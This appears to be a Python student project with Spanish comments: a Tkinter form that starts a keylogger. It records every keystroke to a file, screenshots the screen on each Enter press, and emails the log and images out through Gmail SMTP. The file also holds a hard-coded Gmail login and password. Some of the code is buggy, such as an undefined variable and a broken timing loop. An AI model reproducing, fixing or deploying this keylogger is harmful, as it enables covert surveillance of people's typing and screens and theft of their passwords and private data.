from email.encoders import encode_base64
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from tkinter import *
import time
import sys
from pynput.keyboard import Listener
import pyautogui
import string
import random
import os
import smtplib


#Funciones para el menú (EN VEZ DE PRINT OTRO, QUE SEA PARA INICIAR CRONOMETRO)
def nombre_img(l):
    letras = string.ascii_letters
    return ''.join(random.choice(letras)for i in range(l))

def bubbleSort(lista):
    for i in range(len(lista)-1,0,-1):
        for j in range(0,i):
            if(lista[j][1] < lista[j+1][1]):
                aux = lista[j]
                lista[j]=lista[j+1]
                lista[j+1]=aux

def e_cronologico():
    ventana.destroy()
    n = str(nombre.get())
    c = correo.get()
    a = asunto.get()
    t = int(tiempo.get())
    n_img = ""
    listad_img = []
    def write_to_file(key):
        global n_img
        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
            pyautogui.sleep(1)
            num_img = nombre_img(7)
            pyautogui.screenshot(num_img + ".png")
            n_img = str(num_img + ".png")
            listad_img.append(n_img)
        with open(n, 'a') as f:
            f.write(letter)

    # Recolectando eventos hasta parar.
    count = 1
    while count < 3 * t:
        with Listener(on_press=write_to_file) as l:
            l.join()
        m1 = time.time()
        m2 = time.time()
        while count < 5:
            if m2 - m1 >= 2:
                m1 = m2
                m2 = time.time()
                count += 1
            else:
                m2 = time.time()
    # ENVIO DE LAS IMAGENES (al ser cronologico, solo se debe acceder a su Dirección, porque se enlista de acuerdo al orden de llegada)
        #se recolecta la direccion y tamaño de las iamgenes:
    dic_img = {}
    for i in listad_img:
        ruta = os.path.abspath(i)
        size = os.path.getsize(ruta)
        dic_img[ruta] = size

    listao = list(dic_img.items()) #lista de las iamgenes con direccion y tamaño
    # Agregar el txt a la lista para tambien mandarlo
    ruta_t = os.path.abspath(n1)
    tupla_t = (n1, ruta_t)
    listao.append(tupla_t)
    #se adjunta el correo que se enviara: #USEN FOR PARA MANDAR LOS ARCHIVOS
    for i in range(len(listao)):
        archivo = listao[i][0]

        mensaje = MIMEMultipart("KEYLOGGER")
        mensaje["From"] = "prof.rob.automatico@gmail.com"
        mensaje["To"] = c
        mensaje["Subject"] = a

        if (os.path.isfile(archivo)):
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(open(archivo, "rb").read())
            encode_base64(adjunto)
            adjunto.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(archivo))
            mensaje.attach(adjunto)

        smtp = smtplib.SMTP("smtp.gmail.com")
        smtp.starttls()
        smtp.login("prof.rob.automatico@gmail.com", "ROB12345%")
        smtp.sendmail("prof.rob.automatico@gmail.com", c, mensaje.as_string())
        smtp.quit()



def e_tama():
    ventana.destroy()
    n1 = str(nombre.get())
    c1 = correo.get()
    a1 = asunto.get()
    t1 = int(tiempo.get())
    n_img = ""
    listad_img = []
    def write_to_file(key):
        global n_img
        letter = str(key)
        letter = letter.replace("'", "")

        if letter == 'Key.space':
            letter = ' '
        if letter == 'Key.shift_r':
            letter = ''
        if letter == "Key.ctrl_l":
            letter = ""
        if letter == "Key.enter":
            letter = "\n"
            pyautogui.sleep(1)
            num_img = nombre_img(7)
            pyautogui.screenshot(num_img + ".png")
            n_img = str(num_img + ".png")
            listad_img.append(n_img)
        with open(n1, 'a') as f:
            f.write(letter)

    # Recolectando eventos hasta parar.

    count = 1
    while count < 3 * t1:
        with Listener(on_press=write_to_file) as l:
            l.join()
        m1 = time.time()
        m2 = time.time()
        while count < 5:
            if m2 - m1 >= 2:
                m1 = m2
                m2 = time.time()
                count += 1
            else:
                m2 = time.time()
                sys.exit()
    #ORDENAR LA LISTA DE LAS imagenes
    dic_img = {}
    for i in listad_img:
        ruta = os.path.abspath(i)
        size = os.path.getsize(ruta)
        dic_img[ruta] = size

    listao = list(dic_img.items())
    bubbleSort(listao) #lista ordenada
    #Agregar el txt a la lista para tambien mandarlo
    ruta_t = os.path.abspath(n1)
    tupla_t = (n1, ruta_t)
    listao.append(tupla_t)
    #en base a la lista ordenada de imagenes enviar al correo: #USEN FOR
    for i in range(len(listao)):
        archivo = listao[i][0]

        mensaje = MIMEMultipart("KEYLOGGER")
        mensaje["From"] = "prof.rob.automatico@gmail.com"
        mensaje["To"] = c1
        mensaje["Subject"] = a1

        if (os.path.isfile(archivo)):
            adjunto = MIMEBase('application', 'octet-stream')
            adjunto.set_payload(open(archivo, "rb").read())
            encode_base64(adjunto)
            adjunto.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(archivo))
            mensaje.attach(adjunto)

        smtp = smtplib.SMTP("smtp.gmail.com")
        smtp.starttls()
        smtp.login("prof.rob.automatico@gmail.com", "ROB12345%")
        smtp.sendmail("prof.rob.automatico@gmail.com", c1, mensaje.as_string())
        smtp.quit()



#Esto es el menú que le pedirá al usuario los datos
ventana = Tk()
ventana.geometry("400x450")
ventana.title("Formulario de Datos")
encabezado = Label(text = "Formulario de Datos", bg = "black", fg = "white", width = "400", height = "2" )
encabezado.pack()

nombre_t = Label(text = "NOMBRE COMPLETO + .txt: <nombreapellido.txt>")
correo_t = Label(text = "PARA: <ejemplo@gmail.com>")
asunto_t = Label(text = "ASUNTO DEL CORREO:")
tiempo_t = Label(text = "TIEMPO DE EJECUCIÓN: (min)")
nombre_t.place(x = 15, y = 70)
correo_t.place(x = 15, y = 140)
asunto_t.place(x = 15, y = 210)
tiempo_t.place(x = 15, y = 280)

nombre = StringVar()
correo = StringVar()
asunto = StringVar()
tiempo = StringVar()

nombre_e = Entry(textvariable = nombre, width = "50")
correo_e = Entry(textvariable = correo, width = "50")
asunto_e = Entry(textvariable = asunto, width = "50")
tiempo_e = Entry(textvariable = tiempo, width = "50")

nombre_e.place(x = 15, y = 100)
correo_e.place(x = 15, y = 170)
asunto_e.place(x = 15, y = 240)
tiempo_e.place(x = 15, y = 310)

cronologico= Button(text = "CRONOLÓGICO", width = "20", height = "2", command = e_cronologico, bg = "black", fg = "white")
cronologico.place(x = 40, y = 380)

size = Button(text = "TAMAÑO", width = "20", height = "2", command = e_tama, bg = "black", fg = "white")
size.place(x = 220, y = 380)

ventana.mainloop()